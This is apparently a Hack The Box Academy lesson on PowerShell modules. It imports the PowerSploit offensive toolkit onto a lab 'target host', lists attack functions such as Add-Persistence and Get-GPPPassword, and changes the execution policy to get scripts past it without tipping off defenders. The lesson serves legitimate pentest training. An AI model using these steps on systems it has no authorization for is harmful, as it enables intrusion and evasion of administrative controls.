<p>A <a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.2">PowerShell module</a> is structured PowerShell code that is made easy to use &amp; share. As mentioned in the official Microsoft docs, a module can be made up of the following:</p>
<ul>
<li>Cmdlets</li>
<li>Script files</li>
<li>Functions</li>
<li>Assemblies</li>
<li>Related resources (manifests and help files)</li>
</ul>
<p>Through this section, we are going to use the PowerView project to examine what makes up a module and how to interact with them. <code>PowerView.ps1</code> is part of a collection of PowerShell modules organized in a project called <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> created by the <a href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia</a> to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments. Though we may notice this project has been archived, many of the included tools are still relevant and useful in pen-testing today (written in August 2022). We will not extensively cover the usage and implementation of PowerSploit in this module. We will just be using it as a reference to understand PowerShell better. The use of PowerSploit to Enumerate &amp; Attack Windows Domain environments is covered in great depth in the module <a href="https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks">Active Directory Enumeration &amp; Attacks</a>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/ImportModulePowerSploit.png" alt="PowerSploit"></p>
<h4 id="powersploit-psd1">PowerSploit.psd1</h4>
<p>A PowerShell data file (<code>.psd1</code>) is a <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_module\_manifests?view=powershell-7.2">Module manifest file</a>. Contained in a manifest file we can often find:</p>
<ul>
<li>Reference to the module that will be processed</li>
<li>Version numbers to keep track of major changes</li>
<li>The GUID</li>
<li>The Author of the module</li>
<li>Copyright</li>
<li>PowerShell compatibility information</li>
<li>Modules &amp; cmdlets included</li>
<li>Metadata</li>
</ul>
<p><strong>PowerSploit.psd1</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/PowerSploitpsd1.gif" alt="PowerSploitpsd1"></p>
<h4 id="powersploit-psm1">PowerSploit.psm1</h4>
<p>A PowerShell script module file (<code>.psm1</code>) is simply a script containing PowerShell code. Think of this as the meat of a module.</p>
<p><strong>Contents of PowerSploit.psm1</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session"><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-variable">$PSScriptRoot</span> | ? { <span class="hljs-variable">$_</span>.PSIsContainer -and !(<span class="hljs-string">'Tests'</span>,<span class="hljs-string">'docs'</span> <span class="hljs-nomarkup">-contains</span> <span class="hljs-variable">$_</span>.Name) } | % { <span class="hljs-built_in">Import-Module</span> <span class="hljs-variable">$_</span>.FullName -DisableNameChecking }
</code></pre>
<p>The Get-ChildItem cmdlet gets the items in the current directory (represented by the $PSScriptRoot automatic variable), and the Where-Object cmdlet (aliased as the &quot;?&quot; character) filters those down to only the items that are folders and do not have the names &quot;Tests&quot; or &quot;docs&quot;. Finally, the ForEach-Object cmdlet (aliased as the &quot;%&quot; character) executes the Import-Module cmdlet against each of those remaining items, passing the DisableNameChecking parameter to prevent errors if the module contains cmdlets or functions with the same names as cmdlets or functions in the current session.</p>
<hr>
<h3 id="using-powershell-modules">Using PowerShell Modules</h3>
<p>Once we decide what PowerShell module we want to use, we will have to determine how and from where we will run it. We also must consider if the chosen module and scripts are already on the host or if we need to get them on to the host. <code>Get-Module</code> can help us determine what modules are already loaded.</p>
<p><strong>Get-Module</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-<span class="hljs-keyword">Module</span> 

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
<span class="hljs-keyword">Script</span>     <span class="hljs-number">0.0</span>        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   <span class="hljs-number">3.1</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>    Microsoft.PowerShell.Management     {<span class="hljs-keyword">Add</span>-Computer, <span class="hljs-keyword">Add</span>-Content, Checkpoint-Computer, Clear-Con...
Manifest   <span class="hljs-number">3.1</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>    Microsoft.PowerShell.Utility        {<span class="hljs-keyword">Add</span>-Member, <span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span>, Clear-<span class="hljs-keyword">Variable</span>, Compare-Object...}
<span class="hljs-keyword">Script</span>     <span class="hljs-number">0.7</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span>    posh-git                            {<span class="hljs-keyword">Add</span>-PoshGitToProfile, <span class="hljs-keyword">Add</span>-SshKey, Enable-GitColors, Expan...
<span class="hljs-keyword">Script</span>     <span class="hljs-number">2.0</span><span class="hljs-number">.0</span>      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, <span class="hljs-keyword">Remove</span>-PS...
</code></pre>
<p><strong>List-Available</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-<span class="hljs-keyword">Module</span> -ListAvailable 

 Directory: C:\Users\tru7h\Documents\WindowsPowerShell\<span class="hljs-keyword">Modules</span>


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
<span class="hljs-keyword">Script</span>     <span class="hljs-number">1.1</span><span class="hljs-number">.0</span>      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...


    Directory: C:\<span class="hljs-keyword">Program</span> Files\WindowsPowerShell\<span class="hljs-keyword">Modules</span>


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
<span class="hljs-keyword">Script</span>     <span class="hljs-number">1.0</span><span class="hljs-number">.1</span>      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     <span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
<span class="hljs-keyword">Script</span>     <span class="hljs-number">3.4</span><span class="hljs-number">.0</span>      Pester                              {Describe, <span class="hljs-keyword">Context</span>, It, Should...}
<span class="hljs-keyword">Script</span>     <span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>    PowerShellGet                       {Install-<span class="hljs-keyword">Module</span>, Find-<span class="hljs-keyword">Module</span>, <span class="hljs-keyword">Save</span>-<span class="hljs-keyword">Module</span>, Update-<span class="hljs-keyword">Module</span>...}
<span class="hljs-keyword">Script</span>     <span class="hljs-number">2.0</span><span class="hljs-number">.0</span>      PSReadline                          {Get-PSReadLineKeyHandler, <span class="hljs-keyword">Set</span>-PSReadLineKeyHandler, Remov...
</code></pre>
<p>The <code>-ListAvailable</code> modifier will show us all modules we have installed but not loaded into our session.</p>
<p>We have already transferred the desired module or scripts onto a target Windows host. We will then need to run them. We can start through the use of the <code>Import-Module</code> cmdlet.</p>
<p><strong>Using Import-Module</strong></p>
<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2">Import-Module</a> cmdlet allows us to add a module to the current PowerShell session.</p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session"><span class="hljs-symbol">PS</span> <span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Users</span>\htb-student&gt; <span class="hljs-symbol">Get</span>-<span class="hljs-symbol">Help</span> <span class="hljs-symbol">Import</span>-<span class="hljs-symbol">Module</span>

<span class="hljs-symbol">NAME</span>
    <span class="hljs-symbol">Import</span>-<span class="hljs-symbol">Module</span>

<span class="hljs-symbol">SYNOPSIS</span>
    <span class="hljs-symbol">Adds</span> modules to the current session.


<span class="hljs-symbol">SYNTAX</span>
    <span class="hljs-symbol">Import</span>-<span class="hljs-symbol">Module</span> [-<span class="hljs-symbol">Assembly</span>] &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Reflection</span>.<span class="hljs-symbol">Assembly</span>[]&gt; [-<span class="hljs-symbol">Alias</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">ArgumentList</span>
    &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Object</span>[]&gt;] [-<span class="hljs-symbol">AsCustomObject</span>] [-<span class="hljs-symbol">Cmdlet</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">DisableNameChecking</span>] [-<span class="hljs-symbol">Force</span>] [-<span class="hljs-symbol">Function</span>
    &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">Global</span>] [-<span class="hljs-symbol">NoClobber</span>] [-<span class="hljs-symbol">PassThru</span>] [-<span class="hljs-symbol">Prefix</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">Scope</span> {<span class="hljs-symbol">Local</span> | <span class="hljs-symbol">Global</span>}]
    [-<span class="hljs-symbol">Variable</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [&lt;<span class="hljs-symbol">CommonParameters</span>&gt;]

    <span class="hljs-symbol">Import</span>-<span class="hljs-symbol">Module</span> [-<span class="hljs-symbol">Name</span>] &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt; [-<span class="hljs-symbol">Alias</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">ArgumentList</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Object</span>[]&gt;]
    [-<span class="hljs-symbol">AsCustomObject</span>] [-<span class="hljs-symbol">CimNamespace</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">CimResourceUri</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Uri</span>&gt;] -<span class="hljs-symbol">CimSession</span>
    &lt;<span class="hljs-symbol">Microsoft</span>.<span class="hljs-symbol">Management</span>.<span class="hljs-symbol">Infrastructure</span>.<span class="hljs-symbol">CimSession</span>&gt; [-<span class="hljs-symbol">Cmdlet</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">DisableNameChecking</span>] [-<span class="hljs-symbol">Force</span>]
    [-<span class="hljs-symbol">Function</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [-<span class="hljs-symbol">Global</span>] [-<span class="hljs-symbol">MaximumVersion</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">MinimumVersion</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Version</span>&gt;]
    [-<span class="hljs-symbol">NoClobber</span>] [-<span class="hljs-symbol">PassThru</span>] [-<span class="hljs-symbol">Prefix</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">RequiredVersion</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Version</span>&gt;] [-<span class="hljs-symbol">Scope</span> {<span class="hljs-symbol">Local</span> | <span class="hljs-symbol">Global</span>}]
    [-<span class="hljs-symbol">Variable</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>[]&gt;] [&lt;<span class="hljs-symbol">CommonParameters</span>&gt;]

&lt;<span class="hljs-symbol">SNIP</span>&gt;
</code></pre>
<p>To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (<code>Get-NetLocalgroup</code>) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host&#39;s Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup. See this in action in the clip below:</p>
<p><strong>Importing PowerSploit.psd1</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\Users\htb-student\Desktop\PowerSploit&gt; Import-Module .\PowerSploit.psd1
PS C:\Users\htb-student\Desktop\PowerSploit&gt; Get-NetLocalgroup

ComputerName GroupName                           Comment
------------ ---------                           -------
WS01         Access Control Assistance Operators Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> remotely query authorization <span class="hljs-keyword">attributes</span> a...
WS01         Administrators                      Administrators have complete <span class="hljs-keyword">and</span> unrestricted access to the compute...
WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
WS01         Cryptographic Operators             Members are authorized to perform cryptographic <span class="hljs-keyword">operations</span>.
WS01         Distributed COM Users               Members are allowed to launch, activate <span class="hljs-keyword">and</span> use Distributed COM obj...
WS01         Event Log Readers                   Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> <span class="hljs-keyword">read</span> event logs from local machine
WS01         Guests                              Guests have the same access as members of the Users <span class="hljs-keyword">group</span> <span class="hljs-title">by</span> defaul...
WS01         Hyper-V Administrators              Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">have</span> complete <span class="hljs-keyword">and</span> unrestricted access to all ...
WS01         IIS_IUSRS                           Built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">group</span> <span class="hljs-title">used</span> by Internet <span class="hljs-literal">Inf</span>ormation Services.
WS01         Network Configuration Operators     Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> have some administrative privileges to ma...
WS01         Performance Log Users               Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">may</span> schedule logging of performance counters,...
WS01         Performance <span class="hljs-literal">Monitor</span> Users           Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> access performance counter data locally a...
WS01         Power Users                         Power Users are included for backwards compatibility <span class="hljs-keyword">and</span> possess li...
WS01         Remote Desktop Users                Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> <span class="hljs-title">are</span> granted the right to logon remotely
WS01         Remote Management Users             Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> access WMI resources over management prot...
WS01         Replicator                          Supports file replication <span class="hljs-keyword">in</span> a domain
WS01         System Managed Accounts <span class="hljs-keyword">Group</span>       <span class="hljs-title">Members</span> of this <span class="hljs-keyword">group</span> <span class="hljs-title">are</span> managed by the system.
WS01         Users                               Users are prevented from making accidental <span class="hljs-keyword">or</span> intentional system-wi...
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/167/Import-Module.gif" alt="Import-Module"></p>
<p>Notice how at the beginning of the clip, <code>Get-NetLocalgroup</code> was not recognized. This event happened because it is not included in the default module path. We see where the default module path is by listing the environment variable <code>PSModulePath</code>.</p>
<p><strong>Viewing PSModulePath</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span>-student&gt; <span class="hljs-formula">$env:PSModulePath

C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span>-student<span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">Modules</span></span>;C:<span class="hljs-tag">\<span class="hljs-name">Program</span></span> Files<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">Modules</span></span>;C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">system</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">Modules</span></span></span>
</code></pre>
<p>When the PowerSploit.psd1 module is imported, the <code>Get-NetLocalgroup</code> function is recognized. This happens because several modules are included when we load PowerSploit.psd1. It is possible to permanently add a module or several modules by adding the files to the referenced directories in the PSModulePath. This action makes sense if we were using a Windows OS as our primary attack host, but on an engagement, our time would be better off just transferring specific scripts over to the attack host and importing them as needed.</p>
<hr>
<h3 id="execution-policy">Execution Policy</h3>
<p>An essential factor to consider when attempting to use PowerShell scripts and modules is <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2">PowerShell&#39;s execution policy</a>. As outlined in Microsoft&#39;s official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.</p>
<p><strong>Execution Policy&#39;s Impact</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\Users\htb-student\Desktop\PowerSploit&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\PowerSploit.psd1

<span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> : <span class="hljs-keyword">File</span> <span class="hljs-keyword">C</span>:\Users\Users\htb-student\PowerSploit.psm1
cannot be loaded because running scripts is disabled on this system. <span class="hljs-keyword">For</span> more information, see
about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170.</span>
At line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span>
+ <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\PowerSploit.psd1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [<span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span>], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</code></pre>
<p>The host&#39;s execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.</p>
<p><strong>Checking Execution Policy State</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-ExecutionPolicy 

Restricted
</code></pre>
<p>Our current setting restricts what the user can do. If we want to change the setting, we can do so with the <code>Set-ExecutionPolicy</code> cmdlet.</p>
<p><strong>Setting Execution Policy</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">undefined</span>
</code></pre>
<p>By setting the policy to undefined, we are telling PowerShell that we do not wish to limit our interactions. Now we should be able to import and run our script.</p>
<p><strong>Testing It Out</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Import-Module .\PowerSploit.psd1

Import-Module .\PowerSploit.psd1
PS C:\Users\htb&gt; get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   <span class="hljs-number">3.1</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>    Microsoft.PowerShell.Management     {<span class="hljs-keyword">Add</span>-Computer, <span class="hljs-keyword">Add</span>-Content, Check...
Manifest   <span class="hljs-number">3.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>    Microsoft.PowerShell.Security       {ConvertFrom-SecureString, Conver...
Manifest   <span class="hljs-number">3.1</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>    Microsoft.PowerShell.Utility        {<span class="hljs-keyword">Add</span>-Member, <span class="hljs-keyword">Add</span>-Type, Clear-Vari...
Script     <span class="hljs-number">3.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>    PowerSploit                         {<span class="hljs-keyword">Add</span>-Persistence, <span class="hljs-keyword">Add</span>-ServiceDacl...
Script     <span class="hljs-number">2.0</span><span class="hljs-meta">.0</span>      PSReadline                          {Get-PSReadLineKeyHandler, Get-PS...
</code></pre>
<p>Looking at our loaded modules, we can see that we successfully loaded PowerSploit. Now we can use the tools as needed.</p>
<p>Note: As a sysadmin, these kinds of changes are common and should always be reverted once we are done with work. As a pentester, us making a change like this and not reverting it could indicate to a defender that the host has been compromised. Be sure to check that we clean up after our actions. Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using -scope.</p>
<p><strong>Change Execution Policy By Scope</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">-scope Process</span> 
PS <span class="hljs-comment">C:\htb&gt; Get-ExecutionPolicy -list</span>

Scope <span class="hljs-comment">ExecutionPolicy</span>
        ----- ---------------
MachinePolicy       <span class="hljs-comment">Undefined</span>
   UserPolicy       <span class="hljs-comment">Undefined</span>
      Process          <span class="hljs-comment">Bypass</span>
  CurrentUser       <span class="hljs-comment">Undefined</span>
 LocalMachine          <span class="hljs-comment">Bypass</span>
</code></pre>
<p>By changing it at the Process level, our change will revert once we close the PowerShell session. Keep the execution policy in mind when working with scripts and new modules. Of course, we want to look at the scripts we are trying to load first to ensure they are safe for use. As penetration testers, we may run into times when we need to be creative about how we bypass the Execution Policy on a host. This <a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">blog post</a> has some creative ways that we have used on real-world engagements with great success.</p>
<h4 id="calling-cmdlets-and-functions-from-within-a-module">Calling Cmdlets and Functions From Within a Module</h4>
<p>If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use <code>Get-Command -Module &lt;modulename&gt;</code> to enlighten us.</p>
<p><strong>Using Get-Command</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Get-Command</span> <span class="hljs-selector-tag">-Module</span> <span class="hljs-selector-tag">PowerSploit</span>

<span class="hljs-selector-tag">CommandType</span>     <span class="hljs-selector-tag">Name</span>                                               <span class="hljs-selector-tag">Version</span>    <span class="hljs-selector-tag">Source</span>
<span class="hljs-selector-tag">-----------</span>     <span class="hljs-selector-tag">----</span>                                               <span class="hljs-selector-tag">-------</span>    <span class="hljs-selector-tag">------</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Invoke-ProcessHunter</span>                               3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Invoke-ShareFinder</span>                                 3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Invoke-ThreadedFunction</span>                            3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Invoke-UserHunter</span>                                  3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Request-SPNTicket</span>                                  3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Set-ADObject</span>                                       3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Add-Persistence</span>                                    3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Add-ServiceDacl</span>                                    3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-AVSignature</span>                                   3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-InterestingFile</span>                               3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-LocalAdminAccess</span>                              3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-PathDLLHijack</span>                                 3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-ProcessDLLHijack</span>                              3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Get-ApplicationHost</span>                                3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Get-GPPPassword</span>                                    3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">PowerSploit</span>
</code></pre>
<p>Now we can see what was loaded by PowerSploit. From this point, we can use the scripts and functions as needed. This is the easy part, pick the function and let it run.</p>
<h4 id="deep-dive-finding-installing-modules-from-powershell-gallery-github">Deep Dive: Finding &amp; Installing Modules from PowerShell Gallery &amp; GitHub</h4>
<p>In today&#39;s day and age, sharing information is extremely easy. That goes for solutions and new creations as well. When it comes to PowerShell modules, the <a href="https://www.powershellgallery.com/">PowerShell Gallery</a> Is the best place for that. It is a repository that contains PowerShell scripts, modules, and more created by Microsoft and other users. They can range from anything as simple as dealing with user attributes to solving complex cloud storage issues.</p>
<p><strong>PowerShell Gallery</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/powershellg.png" alt="text"></p>
<p>Conveniently for us, There is already a module built into PowerShell meant to help us interact with the PowerShell Gallery called <code>PowerShellGet</code>. Let us take a look at it:</p>
<p><strong>PowerShellGet</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Get-Command</span> <span class="hljs-selector-tag">-Module</span> <span class="hljs-selector-tag">PowerShellGet</span> 

<span class="hljs-selector-tag">CommandType</span>     <span class="hljs-selector-tag">Name</span>                                               <span class="hljs-selector-tag">Version</span>    <span class="hljs-selector-tag">Source</span>
<span class="hljs-selector-tag">-----------</span>     <span class="hljs-selector-tag">----</span>                                               <span class="hljs-selector-tag">-------</span>    <span class="hljs-selector-tag">------</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-Command</span>                                       1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-DscResource</span>                                   1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-Module</span>                                        1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-RoleCapability</span>                                1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Find-Script</span>                                        1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Get-InstalledModule</span>                                1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Get-InstalledScript</span>                                1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Get-PSRepository</span>                                   1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Install-Module</span>                                     1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
